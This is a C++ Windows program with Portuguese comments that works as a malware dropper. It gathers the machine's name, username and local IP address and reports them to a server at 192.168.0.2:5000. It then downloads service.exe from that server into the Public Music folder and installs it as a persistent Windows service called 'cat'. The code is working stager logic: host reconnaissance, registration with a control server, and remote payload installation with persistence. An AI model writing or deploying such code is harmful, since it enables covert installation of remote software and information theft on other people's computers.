#include <windows.h>
#include <wininet.h>
#include <winsock.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <iostream>
#include <lmcons.h>
#include <conio.h>
#include <sstream>
#include <string>
#include "download.h"
#include "activeService.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")



// compilar com -lwininet -lws2_32

using namespace std;

int main() {
    bool downloadSuccess = false;
    bool serviceSuccess = false;
    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    CHAR username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    GetComputerNameA(pcName, &size);
    GetUserNameA(username, &usernameLen);
    string os = "Windows";

    // Obter IP local usando GetAdaptersInfo
    string localIP = "0.0.0.0";
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = 0;
    
    // Primeira chamada para obter o tamanho do buffer necessário
    if (GetAdaptersInfo(NULL, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    
    // Segunda chamada para obter as informações
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        cout << "Interfaces de rede encontradas:\n";
        
        while (pAdapter) {
            cout << "  - " << pAdapter->AdapterName << " (Tipo: " << pAdapter->Type << ")\n";
            
            // Listar IPs dessa interface
            PIP_ADDR_STRING pIpAddr = &pAdapter->IpAddressList;
            while (pIpAddr) {
                cout << "    IP: " << pIpAddr->IpAddress.String << "\n";
                
                // Pega o primeiro IP que não seja 0.0.0.0 ou 127.x.x.x (loopback)
                string ipStr = pIpAddr->IpAddress.String;
                if (ipStr != "0.0.0.0" && ipStr.find("127.") != 0) {
                    localIP = ipStr;
                    cout << "    [SELECIONADO]\n";
                }
                
                pIpAddr = pIpAddr->Next;
            }
            
            pAdapter = pAdapter->Next;
        }
    }
    
    if (pAdapterInfo) {
        free(pAdapterInfo);
    }
    
    cout << "IP local final: " << localIP << "\n";

    cout << "PC Name: " << pcName << "\n" << "Username: " << username << "\n" << "OS: " << os << "\n";

    const char* url = "http://192.168.0.2:5000/addCat";
    cout << "Enviando dados para a url" << url << endl;
    string getData = "?pcName=" + string(pcName) + "&username=" + string(username) + "&os=" + os + "&ip=" + localIP;

    HINTERNET hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "Error ao abrir a sessão de internet" << std::endl;
        getch();
        return 1;
    }

    string fullUrl = url + getData;
    HINTERNET hConnect = InternetOpenUrlA(hInternet, fullUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "Error ao abrir a URL" << std::endl;
        getch();
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Obter o status HTTP
    DWORD dwStatusCode = 0;
    DWORD dwStatusCodeSize = sizeof(dwStatusCode);
    if (!HttpQueryInfoA(hConnect, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwStatusCodeSize, NULL)) {
        std::cerr << "Erro ao obter status HTTP" << std::endl;
        getch();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    cout << "Status HTTP: " << dwStatusCode << endl;

    // Se retornar 409, significa que o IP já foi cadastrado
    if (dwStatusCode == 409) {
        std::cerr << "ERRO: IP " << localIP << " já foi cadastrado no sistema!" << std::endl;
        getch();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Se não for 200, é um erro
    if (dwStatusCode != 200) {
        std::cerr << "Erro: Status HTTP " << dwStatusCode << endl;
        getch();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    DWORD bytesRead = 0;
    CHAR buffer[4096];

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        std::cout.write(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    cout << "Press any key to continue...";

    downloadSuccess = downloadFile("http://192.168.0.2:5000/download/service.exe", "C:\\Users\\Public\\Music\\service.exe");

    if(!downloadSuccess) {
        cerr << "Error downloading file" << endl;
        getch();
        return 1;
    }

    serviceSuccess = InstallService(L"cat", L"C:\\Users\\Public\\Music\\service.exe");

    if(!serviceSuccess) {
        getch();
        cerr << "Error installing service" << endl;
        return 1;
    }
    else {
        cout << "Service installed successfully" << endl;
    }

    getch();
    return 0;
}
 